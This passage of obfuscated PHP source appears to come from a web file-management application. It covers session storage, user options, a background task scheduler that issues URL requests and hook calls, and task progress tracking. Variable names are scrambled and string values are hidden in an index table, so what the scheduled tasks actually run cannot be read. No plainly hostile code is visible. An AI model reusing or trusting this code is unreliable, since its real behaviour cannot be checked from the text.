_listAppendGroup(&$Õâ€¹œ€, $¾Åñä¸×) { $Ô—Çü¯Ê =& $_SERVER[¹Û¹Æ€]; $Ó­Öè‘‚ = array($Ô—Çü¯Ê[1659] => array($Ô—Çü¯Ê[17], $¾Åñä¸×)); $Ê¹½İå = Model($Ô—Çü¯Ê[1939])->where($Ó­Öè‘‚)->select(); $Ş¤¿²× = array_to_keyvalue($Ê¹½İå, $Ô—Çü¯Ê[22], $Ô—Çü¯Ê[1849]); $Ş¤¿²× = array_remove_value(array_unique($Ş¤¿²×), $Ô—Çü¯Ê[207]); if (!$Ş¤¿²× || !$Ê¹½İå) { return; } $Ó­Öè‘‚ = array($Ô—Çü¯Ê[1849] => array($Ô—Çü¯Ê[17], $Ş¤¿²×)); $¼Í´××· = Model($Ô—Çü¯Ê[2030])->field($Ô—Çü¯Ê[2332])->where($Ó­Öè‘‚)->select(); $¼Í´××· = array_to_keyvalue($¼Í´××·, $Ô—Çü¯Ê[1849]); $Ê¹½İå = array_to_keyvalue_group($Ê¹½İå, $Ô—Çü¯Ê[1659]); foreach ($Ê¹½İå as &$Ÿ×Ş¤†„) { $Øèµë›× = array(); foreach ($Ÿ×Ş¤†„ as $·¿Ìô¨Ş) { if (!$·¿Ìô¨Ş[$Ô—Çü¯Ê[1953]]) { continue; } $ıÚÎ…ø« = Model($Ô—Çü¯Ê[516])->listData($·¿Ìô¨Ş[$Ô—Çü¯Ê[1953]]); $Øèµë›×[] = array($Ô—Çü¯Ê[1849] => $·¿Ìô¨Ş[$Ô—Çü¯Ê[1849]], $Ô—Çü¯Ê[2333] => $¼Í´××·[$·¿Ìô¨Ş[$Ô—Çü¯Ê[1849]]][$Ô—Çü¯Ê[42]], $Ô—Çü¯Ê[530] => $¼Í´××·[$·¿Ìô¨Ş[$Ô—Çü¯Ê[1849]]][$Ô—Çü¯Ê[530]], $Ô—Çü¯Ê[422] => $ıÚÎ…ø«); } $Ÿ×Ş¤†„ = $Øèµë›×; } unset($Ÿ×Ş¤†„); foreach ($Õâ€¹œ€ as &$ß³Ô–»Š) { $ß³Ô–»Š[$Ô—Çü¯Ê[2032]] = array(); if (isset($Ê¹½İå[$ß³Ô–»Š[$Ô—Çü¯Ê[1659]]])) { $ß³Ô–»Š[$Ô—Çü¯Ê[2032]] = $Ê¹½İå[$ß³Ô–»Š[$Ô—Çü¯Ê[1659]]]; } } unset($ß³Ô–»Š); } public function userAppendGroup($øÙ»Õ€) { $¯ò¬”°è =& $_SERVER[¹Û¹Æ€]; if (!$øÙ»Õ€) { return array(); } $this->_listAppendGroup($øÙ»Õ€, array_to_keyvalue($øÙ»Õ€, $¯ò¬”°è[22], $¯ò¬”°è[1659])); return $øÙ»Õ€; } private function _listAppendMeta(&$µÎ¤Şî, $š¡Ô¨íè) { $ŒÂŞí’â =& $_SERVER[¹Û¹Æ€]; $ÇÅÜí¿ç = UserJobModel::JOB_KEY; $’¨ÍŒé = array($ŒÂŞí’â[2313]); $©÷¹›È’ = array($ŒÂŞí’â[1659] => array($ŒÂŞí’â[17], $š¡Ô¨íè)); $©á«ê©Ö = Model($ŒÂŞí’â[2311])->where($©÷¹›È’)->select(); $©á«ê©Ö = array_to_keyvalue_group($©á«ê©Ö, $ŒÂŞí’â[1659]); foreach ($©á«ê©Ö as &$‡øšÎ„´) { $ÍÎÜ‡á» = array(); foreach ($‡øšÎ„´ as $˜ îğ‰„) { if (!in_array($˜ îğ‰„[$ŒÂŞí’â[104]], $’¨ÍŒé)) { $ÍÎÜ‡á»[$˜ îğ‰„[$ŒÂŞí’â[104]]] = $˜ îğ‰„[$ŒÂŞí’â[383]]; } } $‡øšÎ„´ = $ÍÎÜ‡á»; } unset($‡øšÎ„´); $³ƒÀ ¡‡ = Model($ŒÂŞí’â[2334]); foreach ($µÎ¤Şî as &$«÷¥ïñã) { $ß· Ó¤‹ = array(); if (isset($©á«ê©Ö[$«÷¥ïñã[$ŒÂŞí’â[1659]]])) { $ß· Ó¤‹ = $©á«ê©Ö[$«÷¥ïñã[$ŒÂŞí’â[1659]]]; } $«÷¥ïñã[$ŒÂŞí’â[2335]] = array(); if (isset($ß· Ó¤‹[$ÇÅÜí¿ç])) { $«÷¥ïñã[$ŒÂŞí’â[2335]] = $³ƒÀ ¡‡->getUserJobInfo($ß· Ó¤‹[$ÇÅÜí¿ç]); } } unset($«÷¥ïñã); } protected function groupUserAll($Ÿ›Ì·¸) { $ãŠ­Íêô =& $_SERVER[¹Û¹Æ€]; if (!$Ÿ›Ì·¸) { return !1; } $Ò¥´Ñç = Model($ãŠ­Íêô[1939])->field($ãŠ­Íêô[1659])->where(array($ãŠ­Íêô[1849] => array($ãŠ­Íêô[17], $Ÿ›Ì·¸)))->select(); $Ò¥´Ñç = array_to_keyvalue($Ò¥´Ñç, $ãŠ­Íêô[22], $ãŠ­Íêô[1659]); return array_unique($Ò¥´Ñç); } public function userSearch($úşÅıâ, $õëœ¤ÉÁ = "\x2a") { return Model($_SERVER[¹Û¹Æ€][544])->where($úşÅıâ)->field($õëœ¤ÉÁ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\x72\137\157\160\x74\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($”«í¬—š) { $Äöà¡“» =& $_SERVER[¹Û¹Æ€]; if (!defined($Äöà¡“»[484])) { define($Äöà¡“»[484], 0); } return "\x55\163\145\x72\x4f\160\164\151\x6f\156\137{$”«í¬—š}\137" . USER_ID; } protected function filterWhere($¯””ì‚ô) { $³•ï Å =& $_SERVER[¹Û¹Æ€]; if (!defined($³•ï Å[484])) { define($³•ï Å[484], 0); } $¯””ì‚ô[$³•ï Å[1659]] = USER_ID; return $¯””ì‚ô; } public function cacheRemoveUser($ãŒ‘Ó­Î, $ù¿úïÏ³) { return Cache::remove("\125\x73\145\x72\117\160\164\x69\x6f\156\x5f{$ãŒ‘Ó­Î}\x5f" . $ù¿úïÏ³); } protected function optionDefault($Ä³øæÔ = '') { $ÔöšŠ™ã =& $_SERVER[¹Û¹Æ€]; if ($Ä³øæÔ == $ÔöšŠ™ã[22]) { return $GLOBALS[$ÔöšŠ™ã[16]][$ÔöšŠ™ã[2336]]; } if ($Ä³øæÔ == $ÔöšŠ™ã[2337]) { return $GLOBALS[$ÔöšŠ™ã[16]][$ÔöšŠ™ã[2338]]; } } } goto a¶÷Â´í„; a¯„²ñÆ×: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $§Ò×•ıÄ =& $_SERVER[¹Û¹Æ€]; static $Íñ±ô­ = false; if ($Íñ±ô­) { return $Íñ±ô­; } $²ô¸¹æ = $GLOBALS[$§Ò×•ıÄ[16]][$§Ò×•ıÄ[358]]; self::$sessionTime = $²ô¸¹æ[$§Ò×•ıÄ[1614]]; $¥§å§·ï = isset($GLOBALS[$§Ò×•ıÄ[1615]]) ? $GLOBALS[$§Ò×•ıÄ[1615]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($¥§å§·ï)) { self::$sessionSign = Cookie::get($¥§å§·ï); } else { self::$sessionSign = guid(); } } Cookie::setSafe($¥§å§·ï, self::$sessionSign, self::$sessionTime); $ã‹½¦ = $²ô¸¹æ[$§Ò×•ıÄ[1616]]; $¢¦¤ ÉÜ = $²ô¸¹æ[$ã‹½¦]; $ÃÎ¬ì¶ = $²ô¸¹æ[$§Ò×•ıÄ[826]]; switch ($ã‹½¦) { case $§Ò×•ıÄ[31]: self::$handle = Model($§Ò×•ıÄ[827]); break; case $§Ò×•ıÄ[828]: self::$handle = new CacheRedis($¢¦¤ ÉÜ, $ÃÎ¬ì¶); break; case $§Ò×•ıÄ[829]: self::$handle = new CacheMemcached($¢¦¤ ÉÜ, $ÃÎ¬ì¶); break; case $§Ò×•ıÄ[209]: $¢¦¤ ÉÜ[$§Ò×•ıÄ[94]] = $¢¦¤ ÉÜ[$§Ò×•ıÄ[94]] . $§Ò×•ıÄ[1617]; self::$handle = new CacheFile($¢¦¤ ÉÜ, $ÃÎ¬ì¶); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $Íñ±ô­ = new self(); return $Íñ±ô­; } public static function getBySign($•µÛ½Ä) { $ÊÚó•Ë± = self::$handle->get($•µÛ½Ä); $ÊÚó•Ë± = unserialize($ÊÚó•Ë±); return is_array($ÊÚó•Ë±) ? $ÊÚó•Ë± : array(); } public static function setBySign($Êí£ø¨ç, $·æäŞ×ß) { CacheLock::lock($Êí£ø¨ç); self::$handle->set($Êí£ø¨ç, serialize($·æäŞ×ß), self::$sessionTime); CacheLock::unlock($Êí£ø¨ç); } public static function sign($ÓËìçà´ = false) { $ÓËìçà´ && (self::$sessionSign = $ÓËìçà´); self::init(); return self::$sessionSign; } public static function set($Ç™ÎÓ—, $íö½²Ã­ = false) { self::init(); if (is_array($Ç™ÎÓ—)) { foreach ($Ç™ÎÓ— as $µÂä ³ => $«ãá×…Ù) { array_set_value(self::$data, $µÂä ³, $«ãá×…Ù); } } else { array_set_value(self::$data, $Ç™ÎÓ—, $íö½²Ã­); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ä§ÈĞˆ— = false) { self::init(); if (!$ä§ÈĞˆ—) { return self::$data; } return array_get_value(self::$data, $ä§ÈĞˆ—); } public static function remove($›€”®¸û) { self::init(); unset(self::$data[$›€”®¸û]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¹Û¹Æ€][831])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Àæ£“Öˆ =& $_SERVER[¹Û¹Æ€]; if (self::valueGet($Àæ£“Öˆ[748]) != $Àæ£“Öˆ[98]) { return; } if (self::valueGet($Àæ£“Öˆ[1618]) == $Àæ£“Öˆ[98]) { $¢®êá’ğ = self::valueGet($Àæ£“Öˆ[1619]); if (time() - $¢®êá’ğ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$Àæ£“Öˆ[1620]] = 1; self::valueSet($Àæ£“Öˆ[1618], $Àæ£“Öˆ[98]); self::log($Àæ£“Öˆ[1621] . ACTION . $Àæ£“Öˆ[1622]); Session::$data = array(); Session::$sessionSign = $Àæ£“Öˆ[22]; $GLOBALS[$Àæ£“Öˆ[512]] = 1; Hook::bind($Àæ£“Öˆ[1623], $Àæ£“Öˆ[1624]); $©¯¤ñåØ = 0; while (!0) { self::cacheClear(); if (self::valueGet($Àæ£“Öˆ[748]) != $Àæ£“Öˆ[98]) { self::valueSet($Àæ£“Öˆ[1618], $Àæ£“Öˆ[207]); self::log($Àæ£“Öˆ[1625]); die; } $ëÀÆ³• = time(); if ($ëÀÆ³• - $©¯¤ñåØ >= 60) { self::valueSet(array($Àæ£“Öˆ[1618] => $Àæ£“Öˆ[98], $Àæ£“Öˆ[1619] => $ëÀÆ³•), !1); $©¯¤ñåØ = $ëÀÆ³•; } if (!file_exists(USER_SYSTEM . $Àæ£“Öˆ[1626])) { self::valueSet(array($Àæ£“Öˆ[1618] => $Àæ£“Öˆ[207], $Àæ£“Öˆ[748] => $Àæ£“Öˆ[207]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $¿Ÿ³ë­â =& $_SERVER[¹Û¹Æ€]; http_close(); self::valueSet($¿Ÿ³ë­â[748], $¿Ÿ³ë­â[207]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($¿Ÿ³ë­â[1618] => $¿Ÿ³ë­â[207], $¿Ÿ³ë­â[748] => $¿Ÿ³ë­â[98]), !1); } public static function taskSwitch() { $¨İà¦¼ =& $_SERVER[¹Û¹Æ€]; $‰Ï”–óñ = self::valueGet($¨İà¦¼[748]) == $¨İà¦¼[98] ? $¨İà¦¼[207] : $¨İà¦¼[98]; self::valueSet($¨İà¦¼[748], $‰Ï”–óñ); } public static function shutdownEvent() { $§¥· ô‹ =& $_SERVER[¹Û¹Æ€]; self::valueSet($§¥· ô‹[1618], $§¥· ô‹[207]); self::log($§¥· ô‹[1627]); } public static function config($ÀÆÖ—ÌÍ, $¬ÍöÛ·) { self::valueSet($_SERVER[¹Û¹Æ€][748], $ÀÆÖ—ÌÍ); } private static function taskRunAll() { $àá›ê¥ø =& $_SERVER[¹Û¹Æ€]; $ò–øè†« = timeFloat(); $ûÙ’ãå¹ = Model($àá›ê¥ø[1628])->listData(); $‡˜ê”Ôú = count($ûÙ’ãå¹); for ($•‚á»¡› = 0; $•‚á»¡› < $‡˜ê”Ôú; $•‚á»¡›++) { $Ô‰˜Û·€ = $ûÙ’ãå¹[$•‚á»¡›]; if (!$Ô‰˜Û·€[$àá›ê¥ø[408]] || $Ô‰˜Û·€[$àá›ê¥ø[1629]] != $àá›ê¥ø[98]) { continue; } if (!self::taskTimeCheck($Ô‰˜Û·€)) { continue; } self::taskRun($Ô‰˜Û·€); } Hook::trigger($àá›ê¥ø[1630]); self::taskQueueRun($ò–øè†«); } private static function taskQueueRun($¿Êöè§ô) { $’½ŒıÖ• = 10; while (!0) { $›À¬§îÆ = TaskQueue::run(); if ($›À¬§îÆ === !1) { break; } if (timeFloat() - $¿Êöè§ô >= $’½ŒıÖ•) { break; } } } private static function taskTimeCheck($¼™öŒ¬) { $§‚Ù•ÊÓ =& $_SERVER[¹Û¹Æ€]; $Ôëß÷üê = json_decode($¼™öŒ¬[$§‚Ù•ÊÓ[213]], !0); $ˆ‘“¨  = intval($¼™öŒ¬[$§‚Ù•ÊÓ[1619]]); $—ÌŠÏÌÕ = strtotime($§‚Ù•ÊÓ[1631] . $Ôëß÷üê[$§‚Ù•ÊÓ[1632]] . $§‚Ù•ÊÓ[1633]) - strtotime($§‚Ù•ÊÓ[1634]); $®¹Ú©ŒÀ = time() - strtotime(date($§‚Ù•ÊÓ[1635]) . $§‚Ù•ÊÓ[1636]); $ªªÅ´ì = $®¹Ú©ŒÀ >= $—ÌŠÏÌÕ && $®¹Ú©ŒÀ <= $—ÌŠÏÌÕ + 3600; switch ($Ôëß÷üê[$§‚Ù•ÊÓ[43]]) { case $§‚Ù•ÊÓ[1637]: if (time() - $ˆ‘“¨  < 3600 * 24 * 30) { return !1; } if ($Ôëß÷üê[$§‚Ù•ÊÓ[1637]] == date($§‚Ù•ÊÓ[1638]) && $ªªÅ´ì) { return !0; } break; case $§‚Ù•ÊÓ[1639]: if (time() - $ˆ‘“¨  < 3600 * 24 * 7) { return !1; } $Ûüàë˜Ø = date($§‚Ù•ÊÓ[1640]) == 0 ? 7 : date($§‚Ù•ÊÓ[1640]); if ($Ôëß÷üê[$§‚Ù•ÊÓ[1639]] == $Ûüàë˜Ø && $ªªÅ´ì) { return !0; } break; case $§‚Ù•ÊÓ[1632]: if (time() - $ˆ‘“¨  < 3600 * 24) { return !1; } if ($ªªÅ´ì) { return !0; } break; case $§‚Ù•ÊÓ[1641]: if (time() - $ˆ‘“¨  >= floatval($Ôëß÷üê[$§‚Ù•ÊÓ[1641]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ÛÏ§õŠï =& $_SERVER[¹Û¹Æ€]; static $õ¯“µ¾• = 0; $°áÑá‰˜ = 300; if (!$õ¯“µ¾•) { $õ¯“µ¾• = time(); } if (time() - $õ¯“µ¾• < $°áÑá‰˜) { return; } $õ¯“µ¾• = time(); $ÊòúŠ“¯ = Model($ÛÏ§õŠï[522])->db($ÛÏ§õŠï[22]); if ($ÊòúŠ“¯) { $ÊòúŠ“¯->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ÛÏ§õŠï[1642], $ÛÏ§õŠï[1643]); die; } } public static function taskRun($Ÿá¢È€”) { $ïúãõ–å =& $_SERVER[¹Û¹Æ€]; self::log($ïúãõ–å[1644] . $Ÿá¢È€”[$ïúãõ–å[408]] . $ïúãõ–å[1645] . $Ÿá¢È€”[$ïúãõ–å[42]] . $ïúãõ–å[1646] . $Ÿá¢È€”[$ïúãõ–å[1647]]); Model($ïúãõ–å[1628])->run($Ÿá¢È€”[$ïúãõ–å[408]]); $‘Èüª¡È = timeFloat(); $ÑŠ¸ ”ñ = $ïúãõ–å[22]; switch ($Ÿá¢È€”[$ïúãõ–å[43]]) { case $ïúãõ–å[316]: $Ú‡‡ÎŒ = url_request($Ÿá¢È€”[$ïúãõ–å[1647]], $ïúãõ–å[240], !1, !1, !1, !1, 10); if ($Ú‡‡ÎŒ[$ïúãõ–å[748]]) { $ÑŠ¸ ”ñ = strlen($Ú‡‡ÎŒ[$ïúãõ–å[1200]]); } break; case $ïúãõ–å[239]: $ÑŠ¸ ”ñ = Hook::apply($Ÿá¢È€”[$ïúãõ–å[1647]]); default: break; } Model($ïúãõ–å[1648])->add(array($ïúãõ–å[1649] => $ïúãõ–å[22], $ïúãõ–å[1650] => $ïúãõ–å[207], $ïúãõ–å[43] => $ïúãõ–å[1651] . $Ÿá¢È€”[$ïúãõ–å[408]], $ïúãõ–å[1652] => json_encode(array($ïúãõ–å[42] => $Ÿá¢È€”[$ïúãõ–å[42]], $ïúãõ–å[1653] => timeFloat() - $‘Èüª¡È, $ïúãõ–å[302] => $ÑŠ¸ ”ñ)))); $Ôş€Ü™ = $ÑŠ¸ ”ñ ? $ïúãõ–å[1654] . $ÑŠ¸ ”ñ : $ïúãõ–å[22]; self::log($ïúãõ–å[1655] . $Ÿá¢È€”[$ïúãõ–å[408]] . $ïúãõ–å[174] . $Ôş€Ü™); return !0; } private static function valueGet($ÄÂóà‚) { $Ğ©ƒ“ƒù =& $_SERVER[¹Û¹Æ€]; $Åş…Í¥Ê = $Ğ©ƒ“ƒù[1656]; $¦³œ¡Ù‘ = Model($Ğ©ƒ“ƒù[444])->get($ÄÂóà‚, $Åş…Í¥Ê); if (is_null($¦³œ¡Ù‘)) { Model($Ğ©ƒ“ƒù[444])->set($Ğ©ƒ“ƒù[748], $Ğ©ƒ“ƒù[98], $Åş…Í¥Ê); Model($Ğ©ƒ“ƒù[444])->set($Ğ©ƒ“ƒù[1618], $Ğ©ƒ“ƒù[207], $Åş…Í¥Ê); $¦³œ¡Ù‘ = Model($Ğ©ƒ“ƒù[444])->get($ÄÂóà‚, $Åş…Í¥Ê); } return $¦³œ¡Ù‘; } private static function valueSet($Åé„Œéà, $ºæŸãÒî) { $ÏîÆ…¿È =& $_SERVER[¹Û¹Æ€]; $—½¾¡ò’ = $ÏîÆ…¿È[1657]; CacheLock::lock($—½¾¡ò’); $®²… ²² = Model($ÏîÆ…¿È[444])->set($Åé„Œéà, $ºæŸãÒî, $ÏîÆ…¿È[1656]); CacheLock::unlock($—½¾¡ò’); return $®²… ²²; } protected static function log($ÛªÖûÕŠ) { write_log($ÛªÖûÕŠ, $_SERVER[¹Û¹Æ€][1643]); } private static function cacheClear() { $Š£Óª¨ˆ =& $_SERVER[¹Û¹Æ€]; Cache::clearMemory(Model($Š£Óª¨ˆ[444])->cacheKey($Š£Óª¨ˆ[1656])); Cache::clearMemory(Model($Š£Óª¨ˆ[444])->cacheKey($Š£Óª¨ˆ[1658])); Model($Š£Óª¨ˆ[1628])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\x6f\x70"; const STATYS_RUNNING = "\162\165\156\x6e\151\156\x67"; const STATYS_KILL = "\153\x69\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($óùµ·“¦, $½™ÖÁ¼ã = '', $šˆšÏ‰Å = 0, $Şâ¤óš = '') { $º¡ìâõ† =& $_SERVER[¹Û¹Æ€]; if (self::get($óùµ·“¦)) { return; } $Ñ¼ÈÆüÒ = defined($º¡ìâõ†[484]) ? USER_ID : $º¡ìâõ†[207]; $this->task = array($º¡ìâõ†[408] => $óùµ·“¦, $º¡ìâõ†[1659] => $Ñ¼ÈÆüÒ, $º¡ìâõ†[1559] => $Şâ¤óš, $º¡ìâõ†[462] => $º¡ìâõ†[22], $º¡ìâõ†[43] => $½™ÖÁ¼ã, $º¡ìâõ†[1061] => $º¡ìâõ†[22], $º¡ìâõ†[784] => $šˆšÏ‰Å, $º¡ìâõ†[1660] => 0, $º¡ìâõ†[1661] => 0, $º¡ìâõ†[1662] => 0, $º¡ìâõ†[1663] => timeFloat(), $º¡ìâõ†[1664] => 0, $º¡ìâõ†[1665] => 0, $º¡ìâõ†[1666] => 0, $º¡ìâõ†[1667] => 0, $º¡ìâõ†[748] => $º¡ìâõ†[1618]); $GLOBALS[$º¡ìâõ†[1668]] = 1; Hook::bind($º¡ìâõ†[1623], array($this, $º¡ìâõ†[1669])); Hook::bind($º¡ìâõ†[1670], array($this, $º¡ìâõ†[1671])); $this->startAfter(); Hook::trigger($º¡ìâõ†[1672], $this->task); $this->task[$º¡ìâõ†[1665]] = timeFloat(); } public function end($²¿»¦Š = '') { $Î§ŠÛß» =& $_SERVER[¹Û¹Æ€]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$Î§ŠÛß»[1665]]) { self::valueSet($this->task[$Î§ŠÛß»[408]], !1); } $this->isEnd = !0; if ($²¿»¦Š) { $this->task[$Î§ŠÛß»[462]] = $²¿»¦Š; } self::log($Î§ŠÛß»[1673] . $this->task[$Î§ŠÛß»[408]] . $Î§ŠÛß»[1674] . sprintf($Î§ŠÛß»[848], timeFloat() - $this->task[$Î§ŠÛß»[1663]]) . $Î§ŠÛß»[1675]); Hook::unbind($Î§ŠÛß»[1623], array($this, $Î§ŠÛß»[1669])); Hook::unbind($Î§ŠÛß»[1670], array($this, $Î§ŠÛß»[1671])); $this->endAfter(); $÷¹ãîÏ = $this->task; $this->task = !1; Hook::trigger($Î§ŠÛß»[1676], $÷¹ãîÏ); } public function update($—ŸÍ¯‰ = 0, $ü±À—ûà = false) { $Øåøöõû =& $_SERVER[¹Û¹Æ€]; $Ì¢¶Š‘ =& $this->task; if (!$Ì¢¶Š‘) { return; } $Ì¢¶Š‘[$Øåøöõû[1660]] += $—ŸÍ¯‰; $Ì¢¶Š‘[$Øåøöõû[1664]] = timeFloat(); if ($Ì¢¶Š‘[$Øåøöõû[784]]) { if ($Ì¢¶Š‘[$Øåøöõû[784]] < $Ì¢¶Š‘[$Øåøöõû[1660]]) { $Ì¢¶Š‘[$Øåøöõû[784]] = $Ì¢¶Š‘[$Øåøöõû[1660]]; } $®¨×î·• = timeFloat() - $Ì¢¶Š‘[$Øåøöõû[1663]] - $Ì¢¶Š‘[$Øåøöõû[1666]]; if ($®¨×î·• <= 0) { $®¨×î·• = 0.001; } $Ì¢¶Š‘[$Øåøöõû[1661]] = $Ì¢¶Š‘[$Øåøöõû[1660]] / $Ì¢¶Š‘[$Øåøöõû[784]]; $Ì¢¶Š‘[$Øåøöõû[1662]] = $Ì¢¶Š‘[$Øåøöõû[1660]] / $®¨×î·•; if ($Ì¢¶Š‘[$Øåøöõû[1661]] > 0) { $Ì¢¶Š‘[$Øåøöõû[1667]] = $®¨×î·• * (1 - $Ì¢¶Š‘[$Øåøöõû[1661]]) / $Ì¢¶Š‘[$Øåøöõû[1661]]; } $Ì¢¶Š‘[$Øåøöõû[1667]] = $Ì¢¶Š‘[$Øåøöõû[1667]] <= 0 ? 0 : $Ì¢¶Š‘[$Øåøöõû[1667]]; } $this->updateAfter(); $»¾òù·Ò = 0.2; if (timeFloat() - $Ì¢¶Š‘[$Øåøöõû[1665]] < $»¾òù·Ò && !$ü±À—ûà) { return; } $ÉÇÄ¦³¶ = self::get($Ì¢¶Š‘[$Øåøöõû[408]]); $ŠäğıÉ = $ÉÇÄ¦³¶[$Øåøöõû[748]]; if ($ŠäğıÉ == self::STATYS_KILL) { $‚ĞÎãÑ = array($Øåøöõû[1677] => LNG($Øåøöõû[1678]), $Øåøöõû[1210] => !1); Cache::set($Øåøöõû[1679] . $this->task[$Øåøöõû[408]], $‚ĞÎãÑ, 30); $this->onKill(); $this->end(); die; } else { if ($ŠäğıÉ == self::STATYS_STOP) { $ï¾ìàÆ³ = 2; $ÉÇÄ¦³¶[$Øåøöõû[1666]] += $ï¾ìàÆ³; self::valueSet($Ì¢¶Š‘[$Øåøöõû[408]], $ÉÇÄ¦³¶); sleep($ï¾ìàÆ³); $this->update(); return; } } $Ì¢¶Š‘[$Øåøöõû[748]] = $ŠäğıÉ ? $ŠäğıÉ : $Ì¢¶Š‘[$Øåøöõû[748]]; $Ì¢¶Š‘[$Øåøöõû[1666]] = $ÉÇÄ¦³¶[$Øåøöõû[1666]] ? $ÉÇÄ¦³¶[$Øåøöõû[1666]] : 0; $Ì¢¶Š‘[$Øåøöõû[1665]] = timeFloat(); Hook::trigger($Øåøöõû[1680], $Ì¢¶Š‘); self::valueSet($Ì¢¶Š‘[$Øåøöõû[408]], $Ì¢¶Š‘); } public function onKillSet($ï…£…€÷, $ »’–— = array()) { $this->onKillCall = array($ï…£…€÷, $ »’–—); } public function onKill() { $ÏÛ‰å† =& $_SERVER[¹Û¹Æ€]; self::log($ÏÛ‰å†[1673] . $this->task[$ÏÛ‰å†[408]] . $ÏÛ‰å†[1681]); Hook::trigger($ÏÛ‰å†[1682], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Î¢ù¡Ü¥) { $‰®•Íó© =& $_SERVER[¹Û¹Æ€]; Cache::set($‰®•Íó©[1679] . $this->task[$‰®•Íó©[408]], $Î¢ù¡Ü¥, 60); return $Î¢ù¡Ü¥; } public static function get($àü¼ÃÊ£) { $œ¾‹˜‚‚ =& $_SERVER[¹Û¹Æ€]; $ Å¸Ÿ¤ë = self::valueGet($àü¼ÃÊ£); if (is_array($ Å¸Ÿ¤ë) && $ Å¸Ÿ¤ë[$œ¾‹˜‚‚[1683]]) { $Œ”ÃŠŞš = ActionApply($ Å¸Ÿ¤ë[$œ¾‹˜‚‚[1683]], array($ Å¸Ÿ¤ë)); $ Å¸Ÿ¤ë = is_array($Œ”ÃŠŞš) ? $Œ”ÃŠŞš : $ Å¸Ÿ¤ë; } return $ Å¸Ÿ¤ë; } public static function listData() { $Óµ€«İó = self::valueGet(); return array_sort_by($Óµ€«İó, $_SERVER[¹Û¹Æ€][1663], !0); } public static function kill($§îšÚÁü) { return self::changeStatus($§îšÚÁü, self::STATYS_KILL); } public static function stop($…Î†Ç€å) { return self::changeStatus($…Î†Ç€å, self::STATYS_STOP); } public static function restart($í”Ö×) { return self::changeStatus($í”Ö×, self::STATYS_RUNNING); } public static function killAll() { $ÚÃ€Ô¹í =& $_SERVER[¹Û¹Æ€]; $¶ÀÉÓÍØ = self::listData(); foreach ($¶ÀÉÓÍØ as $ÕÉšú²ˆ) { self::kill($ÕÉšú²ˆ[$ÚÃ€Ô¹í[408]]); } sleep(2); foreach ($¶ÀÉÓÍØ as $ÕÉšú²ˆ) { self::valueSet($ÕÉšú²ˆ[$ÚÃ€Ô¹í[408]], !1); } } private static function changeStatus($ƒı—õæ, $¶ÒÅæ‹‘) { $£ÃÏÌÒ =& $_SERVER[¹Û¹Æ€]; $¶ë–èŸ = self::valueGet($ƒı—õæ); if (!$¶ë–èŸ) { return !1; } $¶ë–èŸ[$£ÃÏÌÒ[748]] = $¶ÒÅæ‹‘; self::valueSet($ƒı—õæ, $¶ë–èŸ); self::log($£ÃÏÌÒ[1684] . $¶ë–èŸ[$£ÃÏÌÒ[408]] . $£ÃÏÌÒ[1685] . $¶ÒÅæ‹‘); return !0; } public static function valueGet($íŸœà®Š = false) { $ñ£´‹ì¶ =& $_SERVER[¹Û¹Æ€]; $ÇƒÌêó = defined($ñ£´‹ì¶[484]) ? USER_ID : $ñ£´‹ì¶[207]; if ($íŸœà®Š) { $±©Üùô¹ = Model($ñ£´‹ì¶[456])->where(array($ñ£´‹ì¶[104] => $íŸœà®Š, $ñ£´‹ì¶[43] => $ñ£´‹ì¶[1068]))->find(); return $±©Üùô¹ ? json_decode($±©Üùô¹[$ñ£´‹ì¶[383]], !0) : !1; } return self::taskListUser($ÇƒÌêó); } public static function taskListUser($ÏÏÁ¸ÑÇ = false) { $¬Ôƒúè =& $_SERVER[¹Û¹Æ€]; $…Ó±Ö¿ß = array($¬Ôƒúè[43] => $¬Ôƒúè[1068]); if ($ÏÏÁ¸ÑÇ) { $…Ó±Ö¿ß[$¬Ôƒúè[1659]] = $ÏÏÁ¸ÑÇ; } $Ä¤Ö¾€æ = Model($¬Ôƒúè[456])->where($…Ó±Ö¿ß)->select(); $Ä¤Ö¾€æ = $Ä¤Ö¾€æ ? $Ä¤Ö¾€æ : array(); foreach ($Ä¤Ö¾€æ as $Ÿ„ô‰ğâ => $Ğ³¼€«Û) { $Ä¤Ö¾€æ[$Ÿ„ô‰ğâ] = json_decode($Ğ³¼€«Û[$¬Ôƒúè[383]], !0); } return $Ä¤Ö¾€æ; } public static function valueSet($Ç†¦ÁÁ›, $ğŞÁ€æ) { $æª¹Œ†Å =& $_SERVER[¹Û¹Æ€]; if (!$ğŞÁ€æ) { return Model($æª¹Œ†Å[456])->where(array($æª¹Œ†Å[104] => $Ç†¦ÁÁ›, $æª¹Œ†Å[43] => $æª¹Œ†Å[1068]))->delete(); } $Æ…• ó˜ = json_encode($ğŞÁ€æ); if (!$Æ…• ó˜) { ob_start(); var_dump($ğŞÁ€æ); $Õô”’¸Ä = ob_get_clean(); self::log($æª¹Œ†Å[1686] . json_encode_force($Õô”’¸Ä)); } if (!$Ç†¦ÁÁ› 